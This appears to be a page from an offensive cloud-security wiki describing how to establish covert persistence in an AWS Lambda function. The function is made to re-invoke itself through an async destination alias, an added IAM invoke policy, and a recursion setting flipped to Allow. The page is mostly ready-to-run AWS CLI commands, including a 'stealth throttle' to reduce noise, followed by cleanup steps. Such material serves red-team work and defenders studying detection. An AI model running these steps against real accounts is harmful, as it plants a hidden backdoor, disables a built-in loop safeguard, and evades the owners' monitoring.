# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

Abuse Lambda asynchronous destinations together with the Recursion configuration to make a function continually re-invoke itself with no external scheduler (no EventBridge, cron, etc.). By default, Lambda terminates recursive loops, but setting the recursion config to Allow re-enables them. Destinations deliver on the service side for async invokes, so a single seed invoke creates a stealthy, code-free heartbeat/backdoor channel. Optionally throttle with reserved concurrency to keep noise low.

Notes
- Lambda does not allow configuring the function to be its own destination directly. Use a function alias as the destination and allow the execution role to invoke that alias.
- Minimum permissions: ability to read/update the target function’s event invoke config and recursion config, publish a version and manage an alias, and update the function’s execution role policy to allow lambda:InvokeFunction on the alias.

## Requirements
- Region: us-east-1
- Vars:
  - REGION=us-east-1
  - TARGET_FN=<target-lambda-name>

## Steps

1) Get function ARN and current recursion setting
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```

2) Publish a version and create/update an alias (used as self destination)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
  aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
  aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```

3) Allow the function execution role to invoke the alias (required by Lambda Destinations→Lambda)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "lambda:InvokeFunction",
      "Resource": "${ALIAS_ARN}"
    }
  ]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```

4) Configure async destination to the alias (self via alias) and disable retries
```
aws lambda put-function-event-invoke-config \
  --function-name "$TARGET_FN" \
  --destination-config OnSuccess={Destination=$ALIAS_ARN} \
  --maximum-retry-attempts 0 \
  --region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```

5) Allow recursive loops
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```

6) Seed a single asynchronous invoke
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```

7) Observe continuous invocations (examples)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```

8) Optional stealth throttle
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```

## Cleanup
Break the loop and remove persistence.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```

## Impact
- Single async invoke causes Lambda to continually re-invoke itself with no external scheduler, enabling stealthy persistence/heartbeat. Reserved concurrency can limit noise to a single warm execution.
